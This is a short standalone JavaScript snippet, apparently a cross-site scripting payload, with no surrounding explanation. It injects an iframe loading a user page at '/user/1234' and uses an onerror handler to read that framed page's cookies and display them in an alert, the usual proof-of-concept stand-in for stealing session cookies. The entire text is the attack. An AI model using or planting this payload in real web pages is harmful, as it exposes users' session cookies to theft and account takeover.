function bru() {
 var cookies = document.getElementById('f').contentDocument.cookie;
 alert(cookies);
};
document.write('<iframe id="f" onerror="bru()" src="/user/1234"></iframe>');
